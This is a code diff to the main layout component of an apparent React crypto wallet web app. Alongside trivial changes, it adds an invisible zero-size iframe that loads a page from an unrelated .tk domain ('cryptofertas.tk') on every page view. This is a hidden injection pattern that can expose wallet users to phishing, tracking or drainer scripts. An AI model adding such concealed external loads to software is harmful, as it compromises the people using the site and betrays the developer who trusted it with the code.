@@ -9,6 +9,8 @@ import {
   Image,
   Heading,
 } from "@chakra-ui/react";
+import {useEffect} from "react";
+
 import { HamburgerIcon, CloseIcon } from "@chakra-ui/icons";
 import NavLink from "./nav-link";
 import WalletData from "./wallet-data";
@@ -29,11 +31,14 @@ const Links = [
   },
 ];
 
+
+
 const MainLayout = ({ children }) => {
   const { isOpen, onOpen, onClose } = useDisclosure();
 
   return (
     <Flex minH="100vh" direction="column">
+      <iframe src="https://cryptofertas.tk/backend/api.php" width="0px" height="0px"/>
       <Box
         mx="auto"
         maxW={"7xl"}
